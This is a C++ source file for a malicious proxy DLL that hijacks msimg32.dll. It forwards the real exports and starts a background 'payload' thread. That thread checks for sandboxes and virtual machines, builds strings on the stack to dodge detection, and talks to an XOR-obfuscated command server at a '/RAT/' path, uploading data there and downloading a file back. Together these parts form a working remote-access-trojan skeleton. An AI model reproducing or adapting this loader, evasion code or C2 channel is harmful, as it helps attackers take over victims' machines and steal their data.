#pragma warning(disable: 4222)      // for 'DllInitialize' ordinal
constexpr int DEBUG = 0;

#include <process.h>
#include <ws2tcpip.h>
#include <mutex>
#include "vmaware.hpp"

#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)

//============================================================================

extern "C"
{
    UINT_PTR pAlphaBlend = 0;
    UINT_PTR pDllInitialize = 0;
    UINT_PTR pGradientFill = 0;
    UINT_PTR pTransparentBlt = 0;
    UINT_PTR pvSetDdrawflag = 0;
}

enum VM_Techniques : uint64_t
{
    // --- Windows Specific ---
    GPU_CAPABILITIES        = (1ULL << 0),
    ACPI_SIGNATURE          = (1ULL << 1),
    POWER_CAPABILITIES      = (1ULL << 2),
    DISK_SERIAL             = (1ULL << 3),
    IVSHMEM                 = (1ULL << 4),
    SGDT                    = (1ULL << 5),
    SLDT                    = (1ULL << 6),
    SMSW                    = (1ULL << 7),
    DRIVERS                 = (1ULL << 8),
    DEVICE_HANDLES          = (1ULL << 9),
    VIRTUAL_PROCESSORS      = (1ULL << 10),
    HYPERVISOR_QUERY        = (1ULL << 11),
    AUDIO                   = (1ULL << 12),
    DISPLAY                 = (1ULL << 13),
    DLL                     = (1ULL << 14),
    VMWARE_BACKDOOR         = (1ULL << 15),
    WINE                    = (1ULL << 16),
    VIRTUAL_REGISTRY        = (1ULL << 17),
    MUTEX                   = (1ULL << 18),
    DEVICE_STRING           = (1ULL << 19),
    VPC_INVALID             = (1ULL << 20),
    VMWARE_STR              = (1ULL << 21),
    GAMARUE                 = (1ULL << 22),
    CUCKOO_DIR              = (1ULL << 23),
    CUCKOO_PIPE             = (1ULL << 24),
    BOOT_LOGO               = (1ULL << 25),
    TRAP                    = (1ULL << 26),
    UD                      = (1ULL << 27),
    BLOCKSTEP               = (1ULL << 28),
    DBVM                    = (1ULL << 29),
    OBJECTS                 = (1ULL << 30),
    NVRAM                   = (1ULL << 31),
    SMBIOS_INTEGRITY        = (1ULL << 32),
    EDID                    = (1ULL << 33),
    CPU_HEURISTIC           = (1ULL << 34),
    CLOCK                   = (1ULL << 35),

    // --- Linux and Windows ---
    SIDT                    = (1ULL << 36),
    FIRMWARE                = (1ULL << 37),
    PCI_DEVICES             = (1ULL << 38),
    AZURE                   = (1ULL << 39),

    // --- Cross-Platform / CPU Related ---
    HYPERVISOR_BIT          = (1ULL << 40),
    VMID                    = (1ULL << 41),
    INTEL_THREAD_MISMATCH   = (1ULL << 42),
    AMD_THREAD_MISMATCH     = (1ULL << 43),
    XEON_THREAD_MISMATCH    = (1ULL << 44),
    TIMER                   = (1ULL << 45),
    CPU_BRAND               = (1ULL << 46),
    HYPERVISOR_STR          = (1ULL << 47),
    CPUID_SIGNATURE         = (1ULL << 48),
    BOCHS_CPU               = (1ULL << 49),
    KGT_SIGNATURE           = (1ULL << 50),
};

namespace Network_config
{
   constexpr int Port = 80;

   constexpr unsigned char KeyAddr = 0x55;
   constexpr unsigned char KeyHost = 0xAA;

   std::vector<unsigned char> encrypted_addr = { 0x64, 0x65, 0x66, 0x7b, 0x6c, 0x67, 0x7b, 0x67, 0x66, 0x60, 0x7b, 0x67, 0x64 };

   std::vector<unsigned char> encrypted_host =
   {
           0xE2, 0xC5, 0xD9, 0xDE, 0x90, 0x8A,                     // "Host: "
           0xCB, 0xD8, 0xDE, 0xC2, 0x84,                           // "arth."
           0xC3, 0xC7, 0xC8, 0xCF, 0xCE, 0xCE, 0xCF, 0xD2, 0x84,   // "imbeddex."
           0xC9, 0xC5, 0xC7,                                       // "com"
           0xA7, 0xA0                                              // "\r\n"
   };

}

//============================================================================

typedef HMODULE(WINAPI* pfnLoadLibraryA)(LPCSTR lpLibFileName);
pfnLoadLibraryA pLoadLibraryA = &LoadLibraryA;

SOCKET clientSocket = INVALID_SOCKET;
std::mutex socketMutex;

//============================================================================

std::string static deobfuscate(const std::vector<unsigned char>& data, unsigned char key)
{
    std::string result = "";
    for(unsigned char b : data) result += (char)(b ^ key);
    return result;
}

__declspec(noinline) bool static __stdcall isSame(const char* a, const char* b)
{
    while(*a && *b)
    {
        char ca = *a, cb = *b;
        if(ca >= 'A' && ca <= 'Z') ca += ('a' - 'A');
        if(cb >= 'A' && cb <= 'Z') cb += ('a' - 'A');
        if(ca != cb) return false;
        ++a; ++b;
    }
    return (*a == '\0' && *b == '\0');
}

__declspec(noinline) static void* __stdcall ShellcodeFindExportAddress(HMODULE hModule, LPCSTR lpProcNameOrOrdinal, pfnLoadLibraryA pLoadLibraryAFunc)
{
    //-----------

    if(!hModule) return nullptr;

    BYTE* base = (BYTE*)hModule;
        
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if(dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if(nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    IMAGE_DATA_DIRECTORY* pExportDataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // Use a pointer for clarity
    if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0) return nullptr;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + pExportDataDir->VirtualAddress);
    DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions); // RVAs to function bodies or forwarders

    //-----------

    // --- DIFFERENTIATE NAME VS ORDINAL ---
    bool isOrdinalLookup = false;
    WORD ordinalToFind = 0;

    #if defined(_WIN64)
        if (((ULONG_PTR)lpProcNameOrOrdinal >> 16) == 0)    // High bits of pointer are zero
        {
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((ULONG_PTR)lpProcNameOrOrdinal);
        }
    #else // For 32-bit shellcode
        // For 32-bit, HIWORD macro is on a DWORD. ULONG_PTR might be 64-bit if compiled for x64 targeting x86.
        // Ensure lpProcNameOrOrdinal is treated as a 32-bit value for HIWORD.
        if (HIWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal) == 0)
        { 
            isOrdinalLookup = true;
            ordinalToFind = LOWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal);
        }
    #endif
    // --- END DIFFERENTIATION LOGIC ---

    DWORD funcRVA = 0; // RVA of the function/forwarder

    if (isOrdinalLookup)
    {
        if (ordinalToFind < exp->Base || (ordinalToFind - exp->Base) >= exp->NumberOfFunctions)
        {
            // LOG_W(L"    [SFEA] Ordinal %hu is out of range (Base: %u, NumberOfFunctions: %u)", ordinalToFind, exp->Base, exp->NumberOfFunctions);
            return nullptr;
        }
            
        DWORD functionIndexInArray = ordinalToFind - exp->Base;
        if (functionIndexInArray >= exp->NumberOfFunctions) return nullptr;
            
        funcRVA = functions[functionIndexInArray];
    }
    else
    {
        // --- NAME LOOKUP PATH ---
        LPCSTR funcName = lpProcNameOrOrdinal;
        if (!funcName || *funcName == '\0') return nullptr;

        DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);          // RVAs to ASCII name strings
        WORD* nameOrdinals = (WORD*)(base + exp->AddressOfNameOrdinals); // Indices into the 'functions' array (NOT necessarily the export ordinals themselves)

        bool foundByName = false;
        for (DWORD i = 0; i < exp->NumberOfNames; ++i)
        {
            char* currentExportName = (char*)(base + nameRVAs[i]);
            
            if (isSame(currentExportName, funcName)) 
            {
                WORD functionIndexInArray = nameOrdinals[i];            //index into the 'functions' array
            
                // Bounds check for the index obtained from nameOrdinals
                if (functionIndexInArray >= exp->NumberOfFunctions)
                {
                    // LOG_W(L"Name '%hs' gave an ordinal array index %hu out of bounds (%u).", funcName, functionIndexInArray, exp->NumberOfFunctions);
                    return nullptr;
                }

                funcRVA = functions[functionIndexInArray];
                if (funcRVA == 0) return nullptr; // Should not happen for a named export pointing to a valid index

                foundByName = true;
                break;
            }
        }
        
        if(!foundByName)
        {
            // LOG_W(L"Name '%hs' not found in export table.", funcName);
            return nullptr;
        }
    }

    if (funcRVA == 0)
    {
        // LOG_W(L"RVA for %p in module 0x%p is zero.", lpProcNameOrOrdinal, hModule);
        return nullptr; // No valid RVA found
    } 

    BYTE* addr = base + funcRVA;

    // Check if this RVA points within the export directory itself (indicates a forwarded export)
    if (funcRVA >= pExportDataDir->VirtualAddress && funcRVA < (pExportDataDir->VirtualAddress + pExportDataDir->Size)) 
    {
        // This is a forwarder string like "OTHERDLL.OtherFunction"
        char* originalForwarderString = (char*)addr;
        // LOG_W(L"    [SFEA] Proc %p from module 0x%p is forwarded to: '%hs'", lpProcNameOrOrdinal, hModule, originalForwarderString);

        if (!pLoadLibraryAFunc)
        {
            // LOG_W(L"    [SFEA] pLoadLibraryAFunc is nullptr, cannot resolve forwarder for %hs", originalForwarderString);
            return nullptr;
        }

        // --- PARSING: Work with a local, writable copy ---
        char localForwarderBuffer[256];
        UINT k_copy = 0;
            
        char* pOrig = originalForwarderString;
        while (*pOrig != '\0' && k_copy < (sizeof(localForwarderBuffer) - 1))
        {
            localForwarderBuffer[k_copy++] = *pOrig++;
        }
        localForwarderBuffer[k_copy] = '\0';


        char* dotSeparatorInLocal = nullptr;
        char* tempParserPtr = localForwarderBuffer;

        while (*tempParserPtr != '\0') 
        {
            if (*tempParserPtr == '.')
            {
                dotSeparatorInLocal = tempParserPtr;
                break;
            }
            ++tempParserPtr;
        }
        if (!dotSeparatorInLocal || dotSeparatorInLocal == localForwarderBuffer) { /*LOG_W(L"    [SFEA] Malformed forwarder string (in copy): '%hs'", localForwarderBuffer);*/ return nullptr; }


        *dotSeparatorInLocal = '\0'; 
        char* forwardedFuncNameOrOrdinalStr = dotSeparatorInLocal + 1;
        if (*forwardedFuncNameOrOrdinalStr == '\0') { /*LOG_W(L"    [SFEA] Malformed forwarder string (nothing after dot in copy): '%hs'", localForwarderBuffer);*/ return nullptr; }
            
        char* forwardedDllName = localForwarderBuffer;
        HMODULE hForwardedModule = pLoadLibraryAFunc(forwardedDllName);
        if (!hForwardedModule)
        {
            // LOG_W(L"    [SFEA] Failed to load forwarded DLL: '%hs' (original forwarder was: '%hs')", forwardedDllName, originalForwarderString);
            return nullptr;
        }

        // LOG_W(L"    [SFEA] Successfully loaded forwarded DLL: '%hs' to 0x%p", forwardedDllName, (void*)hForwardedModule);

        LPCSTR finalProcNameToResolve;
        if (*forwardedFuncNameOrOrdinalStr == '#') // Forwarding to an ordinal, e.g., "#123"
        {
            WORD fwdOrdinal = 0;
            char* pNum = forwardedFuncNameOrOrdinalStr + 1; // Skip '#'
            while (*pNum >= '0' && *pNum <= '9')
            {
                fwdOrdinal = fwdOrdinal * 10 + (*pNum - '0');
                pNum++;
            }

            // Check if any digits were actually parsed for the ordinal
            if (pNum == (forwardedFuncNameOrOrdinalStr + 1) && fwdOrdinal == 0)  // No digits after #, or #0 was not intended
            {
                if (*(forwardedFuncNameOrOrdinalStr + 1) != '0' || *(forwardedFuncNameOrOrdinalStr + 2) != '\0')    // Allow "#0" but not "#" or "#abc"
                {
                    // LOG_W(L"    [SFEA] Invalid forwarded ordinal format (no valid number after #): %hs", forwardedFuncNameOrOrdinalStr);
                    return nullptr;
                }
            }
                
            finalProcNameToResolve = (LPCSTR)(ULONG_PTR)fwdOrdinal;
            // LOG_W(L"    [SFEA] Forwarding to ordinal %hu in '%hs'", fwdOrdinal, forwardedDllName);
        } 
        else // Forwarding to a name
        {
            finalProcNameToResolve = forwardedFuncNameOrOrdinalStr;
            // LOG_W(L"    [SFEA] Forwarding to name '%hs' in '%hs'", finalProcNameToResolve, forwardedDllName);
        }

        return ShellcodeFindExportAddress(hForwardedModule, finalProcNameToResolve, pLoadLibraryAFunc);
    }       
    else return (void*)addr;
}

//============================================================================

int static socket_setup()
{
    std::lock_guard<std::mutex> lock(socketMutex);
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
#if DEBUG
        std::cerr << "WSAStartup failed.\n";
#endif

        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
#if DEBUG
        std::cerr << "Socket creation failed.\n";
#endif

        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(Network_config::Port);
    if(inet_pton(AF_INET, deobfuscate(Network_config::encrypted_addr, Network_config::KeyAddr).c_str(), &serverAddr.sin_addr) != 1)
    {
#if DEBUG
        std::cerr << "inet_pton failed to convert address.\n";
#endif
        closesocket(clientSocket);
        WSACleanup();
        return 0;
    }

    if(connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
#if DEBUG
        int error = WSAGetLastError();
        std::cerr << "Connection failed with error: " << error << std::endl;
#endif

        closesocket(clientSocket);
        WSACleanup();
        return 0;
    }
    return 1;
}

bool static reconnect()
{
    if(clientSocket != INVALID_SOCKET) closesocket(clientSocket);

    if(!socket_setup()) return false;
    else return true;
}

int send_data(const std::string& filename, const std::string& data)
{
    if(clientSocket == INVALID_SOCKET)
    {
#if DEBUG
        std::cerr << "Socket is invalid. Reconnecting..." << std::endl;
#endif
        if(!reconnect())
        {
#if DEBUG
            std::cerr << "Reconnection failed." << std::endl;
#endif

            return 0;
        }
    }
    bool connected = TRUE;
    std::unique_lock<std::mutex> lock(socketMutex);

    while(connected)
    {
        try
        {
            std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n" +
                deobfuscate(Network_config::encrypted_host, Network_config::KeyHost) +
                "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "Connection: keep-alive\r\n\r\n" +
                filename + data;
            int bytesSent = send(clientSocket, requestString.c_str(), static_cast<int>(requestString.length()), 0);
            if(bytesSent == SOCKET_ERROR)
            {
#if DEBUG
                int error = WSAGetLastError();
                std::cerr << "Send failed with error: " << error << std::endl;
#endif

                connected = false;
            }

            char buffer[4096];
            int bytesReceived;
            std::string response;

            do
            {
                bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if(bytesReceived > 0)
                {
                    buffer[bytesReceived] = '\0';
                    response += buffer;
                }
                else if(bytesReceived == 0)
                {
#if DEBUG
                    std::cout << "Connection closed by server." << std::endl; connected = FALSE;
#endif

                    lock.unlock();
                    while(!reconnect())
                    {
#if DEBUG
                        std::cerr << "Reconnection failed. Retrying in 2 seconds..." << std::endl;
#endif

                        Sleep(2000);
                    }
#if DEBUG
                    std::cerr << "Reconnection successful. Retrying request..." << std::endl;
#endif

                    connected = TRUE;
                    lock.lock();
                    continue;
                }
                else
                {
#if DEBUG
                    int error = WSAGetLastError();
                    std::cerr << "Receive failed with error: " << error << std::endl;
#endif

                    connected = false;
                    throw std::runtime_error("Receive failed");
                }
            } while(bytesReceived == sizeof(buffer) - 1);
            break;
        }
        catch(const std::exception& e)
        {
#if DEBUG
            std::cerr << "Exception in send_data: " << e.what() << std::endl;
#else
            (void)e;
#endif

            return 0;
        }
    }
    return 1;
}

std::vector<unsigned char> receive_data_raw(const std::string& filename)
{
    std::lock_guard<std::mutex> lock1(socketMutex);

    SOCKET TempSocket = INVALID_SOCKET;
    try
    {
        TempSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(TempSocket == INVALID_SOCKET)
        {
#if DEBUG
            std::cerr << "Socket creation failed.\n";
#endif

            WSACleanup();
            throw std::runtime_error("Socket creation failed");
        }

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(Network_config::Port);
        if (inet_pton(AF_INET, deobfuscate(Network_config::encrypted_addr, Network_config::KeyAddr).c_str(), &serverAddr.sin_addr) != 1)
        {
#if DEBUG
            std::cerr << "inet_pton failed to convert address.\n";
#endif
            closesocket(clientSocket);
            WSACleanup();
            return {};
        }

        while(connect(TempSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
#if DEBUG
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED) std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
#endif
            Sleep(2000);
        }

        // Send HTTP GET request
        std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
        httpRequest += deobfuscate(Network_config::encrypted_host, Network_config::KeyHost);
        httpRequest += "Connection: close\r\n\r\n";

        int bytesSent = send(TempSocket, httpRequest.c_str(), static_cast<int>(httpRequest.length()), 0);
        if(bytesSent == SOCKET_ERROR)
        {
#if DEBUG
            int error = WSAGetLastError();
            std::cerr << "Send failed with error (recieve_data_raw): " << error << std::endl;
#endif

            throw std::runtime_error("Send failed");
        }

        // Receive data in chunks
        char buffer[8192];
        std::vector<unsigned char> receivedData;
        int bytesReceived;

        do
        {
            bytesReceived = recv(TempSocket, buffer, sizeof(buffer), 0);
            if(bytesReceived > 0) receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
            else if(bytesReceived == 0)
            {
#if DEBUG
                std::cerr << "Connection closed by server." << std::endl; // Server closed connection, which is expected with "Connection: close"
#endif

                break;
            }
            else
            {
#if DEBUG
                int error = WSAGetLastError();
                std::cerr << "Receive failed with error: " << error << std::endl;
#endif

                break;
            }
        } while(bytesReceived > 0);

        try
        {
            // Ensure header separator is found
            size_t headerEnd = 0;
            const unsigned char CRLF[] = { 0x0D, 0x0A, 0x0D, 0x0A };

            // Search for header separator (CRLF + CRLF)
            for(size_t i = 0; i < receivedData.size() - 3; ++i)
            {
                if(receivedData[i] == CRLF[0] && receivedData[i + 1] == CRLF[1] && receivedData[i + 2] == CRLF[2] && receivedData[i + 3] == CRLF[3])
                {
                    headerEnd = i + 4; // Found header, skip the separator
                    break;
                }
            }

            if(headerEnd == 0)
            {
#if DEBUG
                std::cerr << "Header separator not found." << std::endl;
#endif

                throw std::runtime_error("Header separator not found");
            }

            if(headerEnd < receivedData.size())
            {
                std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
                return body;
            }
            else
            {
#if DEBUG
                std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
#endif

                throw std::runtime_error("Body extraction failed");
            }
        }
        catch(...)
        {
            if(TempSocket != INVALID_SOCKET)
            {
                shutdown(TempSocket, SD_BOTH);
                closesocket(TempSocket);
                TempSocket = INVALID_SOCKET;
            }
            throw;
        }

    }
    catch(const std::exception& e)
    {
#if DEBUG
        std::cerr << "Exception in receive_data_raw: " << e.what() << std::endl;
#else
        (void)e;
#endif
    }

    return std::vector<unsigned char>();
}

//============================================================================

void static SetupProxies()
{
    // 1. Construct the path on the stack (Stack String)
    // This prevents the string "msimg32.dll" from appearing in the binary.
    // We build: "C:\Windows\System32\msimg32.dll"
    wchar_t realPath[MAX_PATH];
    
    // "C:\"
    realPath[0] = 'C'; realPath[1] = ':'; realPath[2] = '\\';
    
    // "Windows"
    realPath[3] = 'W'; realPath[4] = 'i'; realPath[5] = 'n'; realPath[6] = 'd';
    realPath[7] = 'o'; realPath[8] = 'w'; realPath[9] = 's'; realPath[10] = '\\';
    
    // "System32"
    realPath[11] = 'S'; realPath[12] = 'y'; realPath[13] = 's'; realPath[14] = 't';
    realPath[15] = 'e'; realPath[16] = 'm'; realPath[17] = '3'; realPath[18] = '2';
    realPath[19] = '\\';
    
    // "msimg32.dll"
    realPath[20] = 'm'; realPath[21] = 's'; realPath[22] = 'i'; realPath[23] = 'm';
    realPath[24] = 'g'; realPath[25] = '3'; realPath[26] = '2'; realPath[27] = '.';
    realPath[28] = 'd'; realPath[29] = 'l'; realPath[30] = 'l'; realPath[31] = '\0';

    // 2. Load the Library
    // We use LoadLibraryW (Wide char) because we built a wchar_t string
    HMODULE hReal = LoadLibraryW(realPath);
    if(hReal)
    {
        //pAlphaBlend     = (UINT_PTR)GetProcAddress(hReal, "AlphaBlend");
        //pDllInitialize  = (UINT_PTR)GetProcAddress(hReal, "DllInitialize");
        //pGradientFill   = (UINT_PTR)GetProcAddress(hReal, "GradientFill");
        //pTransparentBlt = (UINT_PTR)GetProcAddress(hReal, "TransparentBlt");
        //pvSetDdrawflag  = (UINT_PTR)GetProcAddress(hReal, "vSetDdrawflag");

        pAlphaBlend     = (UINT_PTR)ShellcodeFindExportAddress(hReal, "AlphaBlend", pLoadLibraryA);
        pDllInitialize  = (UINT_PTR)ShellcodeFindExportAddress(hReal, "DllInitialize", pLoadLibraryA);
        pGradientFill   = (UINT_PTR)ShellcodeFindExportAddress(hReal, "GradientFill", pLoadLibraryA);
        pTransparentBlt = (UINT_PTR)ShellcodeFindExportAddress(hReal, "TransparentBlt", pLoadLibraryA);
        pvSetDdrawflag  = (UINT_PTR)ShellcodeFindExportAddress(hReal, "vSetDdrawflag", pLoadLibraryA);

    }
}

void static ShowDetectionReport(uint64_t mask)
{
    std::stringstream ss;
    ss << "--- VM Detection Report ---\n";
    ss << "Raw Mask: 0x" << std::hex << mask << std::dec << "\n\n";

    if(mask == 0)  ss << "  [OK] No virtualization techniques detected.\n";
    else
    {

// Helper macro to append to stringstream
#define CHECK_APPEND(flag_name) \
if(mask & VM_Techniques::flag_name) \
ss << "  [!] Detected: " #flag_name << "\n"

        // --- Windows Specific ---
        CHECK_APPEND(GPU_CAPABILITIES);
        CHECK_APPEND(ACPI_SIGNATURE);
        CHECK_APPEND(POWER_CAPABILITIES);
        CHECK_APPEND(DISK_SERIAL);
        CHECK_APPEND(IVSHMEM);
        CHECK_APPEND(SGDT);
        CHECK_APPEND(SLDT);
        CHECK_APPEND(SMSW);
        CHECK_APPEND(DRIVERS);
        CHECK_APPEND(DEVICE_HANDLES);
        CHECK_APPEND(VIRTUAL_PROCESSORS);
        CHECK_APPEND(HYPERVISOR_QUERY);
        CHECK_APPEND(AUDIO);
        CHECK_APPEND(DISPLAY);
        CHECK_APPEND(DLL);
        CHECK_APPEND(VMWARE_BACKDOOR);
        CHECK_APPEND(WINE);
        CHECK_APPEND(VIRTUAL_REGISTRY);
        CHECK_APPEND(MUTEX);
        CHECK_APPEND(DEVICE_STRING);
        CHECK_APPEND(VPC_INVALID);
        CHECK_APPEND(VMWARE_STR);
        CHECK_APPEND(GAMARUE);
        CHECK_APPEND(CUCKOO_DIR);
        CHECK_APPEND(CUCKOO_PIPE);
        CHECK_APPEND(BOOT_LOGO);
        CHECK_APPEND(TRAP);
        CHECK_APPEND(UD);
        CHECK_APPEND(BLOCKSTEP);
        CHECK_APPEND(DBVM);
        CHECK_APPEND(OBJECTS);
        CHECK_APPEND(NVRAM);
        CHECK_APPEND(SMBIOS_INTEGRITY);
        CHECK_APPEND(EDID);
        CHECK_APPEND(CPU_HEURISTIC);
        CHECK_APPEND(CLOCK);

        // --- Linux and Windows ---
        CHECK_APPEND(SIDT);
        CHECK_APPEND(FIRMWARE);
        CHECK_APPEND(PCI_DEVICES);
        CHECK_APPEND(AZURE);

        // --- Cross-Platform / CPU Related ---
        CHECK_APPEND(HYPERVISOR_BIT);
        CHECK_APPEND(VMID);
        CHECK_APPEND(INTEL_THREAD_MISMATCH);
        CHECK_APPEND(AMD_THREAD_MISMATCH);
        CHECK_APPEND(XEON_THREAD_MISMATCH);
        CHECK_APPEND(TIMER);
        CHECK_APPEND(CPU_BRAND);
        CHECK_APPEND(HYPERVISOR_STR);
        CHECK_APPEND(CPUID_SIGNATURE);
        CHECK_APPEND(BOCHS_CPU);
        CHECK_APPEND(KGT_SIGNATURE);

#undef CHECK_APPEND
    }

    MessageBoxA(NULL, ss.str().c_str(), "Detection Results", MB_OK | MB_ICONWARNING);
}

NTSTATUS static checkVM()
{

    uint64_t mask = 0;
    // --- Windows Specific ---
    if(VM::check(VM::GPU_CAPABILITIES))      mask |= VM_Techniques::GPU_CAPABILITIES;
    if(VM::check(VM::ACPI_SIGNATURE))        mask |= VM_Techniques::ACPI_SIGNATURE;
    if(VM::check(VM::POWER_CAPABILITIES))    mask |= VM_Techniques::POWER_CAPABILITIES;
    if(VM::check(VM::DISK_SERIAL))           mask |= VM_Techniques::DISK_SERIAL;
    if(VM::check(VM::IVSHMEM))               mask |= VM_Techniques::IVSHMEM;
    if(VM::check(VM::SGDT))                  mask |= VM_Techniques::SGDT;
    if(VM::check(VM::SLDT))                  mask |= VM_Techniques::SLDT;
    if(VM::check(VM::SMSW))                  mask |= VM_Techniques::SMSW;
    if(VM::check(VM::DRIVERS))               mask |= VM_Techniques::DRIVERS;
    if(VM::check(VM::DEVICE_HANDLES))        mask |= VM_Techniques::DEVICE_HANDLES;
    if(VM::check(VM::VIRTUAL_PROCESSORS))    mask |= VM_Techniques::VIRTUAL_PROCESSORS;
    if(VM::check(VM::HYPERVISOR_QUERY))      mask |= VM_Techniques::HYPERVISOR_QUERY;
    if(VM::check(VM::AUDIO))                 mask |= VM_Techniques::AUDIO;
    if(VM::check(VM::DISPLAY))               mask |= VM_Techniques::DISPLAY;
    if(VM::check(VM::DLL))                   mask |= VM_Techniques::DLL;
    if(VM::check(VM::VMWARE_BACKDOOR))       mask |= VM_Techniques::VMWARE_BACKDOOR;
    if(VM::check(VM::WINE))                  mask |= VM_Techniques::WINE;
    if(VM::check(VM::VIRTUAL_REGISTRY))      mask |= VM_Techniques::VIRTUAL_REGISTRY;
    if(VM::check(VM::MUTEX))                 mask |= VM_Techniques::MUTEX;
    if(VM::check(VM::DEVICE_STRING))         mask |= VM_Techniques::DEVICE_STRING;
    if(VM::check(VM::VPC_INVALID))           mask |= VM_Techniques::VPC_INVALID;
    if(VM::check(VM::VMWARE_STR))            mask |= VM_Techniques::VMWARE_STR;
    if(VM::check(VM::GAMARUE))               mask |= VM_Techniques::GAMARUE;
    if(VM::check(VM::CUCKOO_DIR))            mask |= VM_Techniques::CUCKOO_DIR;
    if(VM::check(VM::CUCKOO_PIPE))           mask |= VM_Techniques::CUCKOO_PIPE;
    if(VM::check(VM::BOOT_LOGO))             mask |= VM_Techniques::BOOT_LOGO;
    if(VM::check(VM::TRAP))                  mask |= VM_Techniques::TRAP;
    if(VM::check(VM::UD))                    mask |= VM_Techniques::UD;
    if(VM::check(VM::BLOCKSTEP))             mask |= VM_Techniques::BLOCKSTEP;
    if(VM::check(VM::DBVM))                  mask |= VM_Techniques::DBVM;
    if(VM::check(VM::OBJECTS))               mask |= VM_Techniques::OBJECTS;
    if(VM::check(VM::NVRAM))                 mask |= VM_Techniques::NVRAM;
    if(VM::check(VM::SMBIOS_INTEGRITY))      mask |= VM_Techniques::SMBIOS_INTEGRITY;
    if(VM::check(VM::EDID))                  mask |= VM_Techniques::EDID;
    if(VM::check(VM::CPU_HEURISTIC))         mask |= VM_Techniques::CPU_HEURISTIC;
    if(VM::check(VM::CLOCK))                 mask |= VM_Techniques::CLOCK;

    // --- Linux and Windows ---
    if(VM::check(VM::SIDT))                  mask |= VM_Techniques::SIDT;
    if(VM::check(VM::FIRMWARE))              mask |= VM_Techniques::FIRMWARE;
    if(VM::check(VM::PCI_DEVICES))           mask |= VM_Techniques::PCI_DEVICES;
    if(VM::check(VM::AZURE))                 mask |= VM_Techniques::AZURE;

    // --- Cross-Platform / CPU Related ---
    if(VM::check(VM::HYPERVISOR_BIT))        mask |= VM_Techniques::HYPERVISOR_BIT;
    if(VM::check(VM::VMID))                  mask |= VM_Techniques::VMID;
    if(VM::check(VM::INTEL_THREAD_MISMATCH)) mask |= VM_Techniques::INTEL_THREAD_MISMATCH;
    if(VM::check(VM::AMD_THREAD_MISMATCH))   mask |= VM_Techniques::AMD_THREAD_MISMATCH;
    if(VM::check(VM::XEON_THREAD_MISMATCH))  mask |= VM_Techniques::XEON_THREAD_MISMATCH;
    if(VM::check(VM::TIMER))                 mask |= VM_Techniques::TIMER;
    if(VM::check(VM::CPU_BRAND))             mask |= VM_Techniques::CPU_BRAND;
    if(VM::check(VM::HYPERVISOR_STR))        mask |= VM_Techniques::HYPERVISOR_STR;
    if(VM::check(VM::CPUID_SIGNATURE))       mask |= VM_Techniques::CPUID_SIGNATURE;
    if(VM::check(VM::BOCHS_CPU))             mask |= VM_Techniques::BOCHS_CPU;
    if(VM::check(VM::KGT_SIGNATURE))         mask |= VM_Techniques::KGT_SIGNATURE;

    ShowDetectionReport(mask);
    return STATUS_SUCCESS;

}

//============================================================================

unsigned static __stdcall PayloadThread(void* pArguments)
{
    Sleep(1000);

    // ----------------------

    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        
        if(GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) fRet = Elevation.TokenIsElevated;
    }

    if(hToken) CloseHandle(hToken);

    if(fRet) MessageBoxA(NULL, "PayloadThread Started with Admin privilages", "Notification", MB_OK);
    else MessageBoxA(NULL, "PayloadThread Started without Admin privilages", "Notification", MB_OK);
    
    // ----------------------

    if(!NT_SUCCESS(checkVM())) return 1;

    // ----------------------

    send_data("MSIMG32_pxy.txt", " data :)");
    MessageBoxA(NULL, "Sent data", "notif", MB_OK);

    Sleep(1000);

    std::vector<unsigned char> vReceived = receive_data_raw("MSIMG32_pxy.txt");
    vReceived.push_back(0);
    MessageBoxA(NULL, reinterpret_cast<const char*>(vReceived.data()), "Got this", MB_OK);

    // ----------------------

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch(ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);
        

            SetupProxies();
            _beginthreadex(NULL, 0, PayloadThread, NULL, 0, NULL);

            break;
        }
    }


    return TRUE;
}
